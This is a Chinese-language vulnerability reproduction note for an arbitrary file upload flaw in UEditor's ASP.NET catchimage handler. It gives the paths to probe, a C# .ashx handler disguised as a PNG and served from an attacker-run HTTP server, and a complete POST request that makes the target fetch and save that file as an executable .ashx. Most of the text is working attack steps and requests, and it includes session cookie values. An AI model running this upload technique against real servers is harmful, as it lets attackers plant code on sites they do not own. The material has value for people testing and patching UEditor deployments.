# ueditor存在任意文件上传漏洞(ASP)

### 一、漏洞描述
ueditor存在任意文件上传漏洞

### 二、影响版本
![1720728132194-b3f361fa-461b-41ae-97cf-c3e8d0598b22.png](./img/EWfoqq_KAC_e407D/1720728132194-b3f361fa-461b-41ae-97cf-c3e8d0598b22-254218.png)

### 三、漏洞复现
Ueditor路径：

```plain
/ueditor/
/ueditor-1.4.3.3/net/
/ueditor1_4_3_3-utf8-net/utf8-net/
/utf8-net/
```

将下面内容保存为1.png，上传至vps，开启一个http服务

```plain
<% @ webhandler language="C#" class="AverageHandler" %> 

using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
public bool IsReusable 
{ get { return true; } } 
public void ProcessRequest(HttpContext ctx) 
{ 
ctx.Response.Write("hello"); 
} 
}
```

```plain
python3 -m http.server 7788
```

![1720728231495-e068f2bf-373c-447c-8d8a-150d25672803.png](./img/EWfoqq_KAC_e407D/1720728231495-e068f2bf-373c-447c-8d8a-150d25672803-580779.png)

发送如下请求包

```plain
POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: 
Cookie: ASP.NET_SessionId=0mw04qyo4jalkcgevkbdkotv; __RequestVerificationToken=TNLqbzboAbqK2T54GItDL80FA6wOaHCxRbAZAQut2sPldVD0A-AH6sGP2qalhJHbi3hWsr5xFm6876Ry9qflBN0XCyPKxxbxW3LkvPnuK7k1; .AspNet.UCApplicationCookie140400=soA1FErOUkdJQBpnPjyHZHzf2PluHG15CUYnRyqYd1zFQnAZlO2sBfAejgbJrZSp4DlToc1x83M-4FIjJ_9tUAzdhNX4CFrSWMX-Ei0swS4fwQbhx3qUwf1O_2NLM-1GPIqfeobbuEUTDJLkUHAl8QnJ5hHYlVW8l5lAPcPXhC6SgtQ16CyZdkjyA4Ze2EXeZhxnXoaL5MoUPknVb8fifAf707edXAl9C5m1oHr--G0JEXENSsTO5v0XthLL2eKUJMvV-dT4zF9v4P_6yNgNfEYFrxRXOECifw6lG3RHiqd61gHGotFovOTA7gvEvwQKlXjFq773nrkqOH8raEVObyvY8NYy9o8MFx1ugGLvnLMhi_4YblQ62Sf7mR2X8clwCJFEVEeTncPNXHi9c4HAX9b0iOIQ_JVmbWdkl-ZJar59F9eonUySWn5eKSMAhu96EWxGOb33jpmqmVw4j-RDX0O7qB0hsBLasTJHnOJsqlgiQR62SzFciYnB-wdnyu1V
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

source[]=http://x:7788/1.png?.ashx
```

![1720728261799-9905053c-1573-4008-8068-be3cbb0032a0.png](./img/EWfoqq_KAC_e407D/1720728261799-9905053c-1573-4008-8068-be3cbb0032a0-485515.png)

```plain
/ueditor/net/upload/image/20240712/6385635362820339411030114.ashx
```

![1720728287383-40ccdb4e-9c26-4d58-8080-637f358a5243.png](./img/EWfoqq_KAC_e407D/1720728287383-40ccdb4e-9c26-4d58-8080-637f358a5243-565362.png)



> 更新: 2024-09-05 23:24:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tkcf54qe88wyd3z2>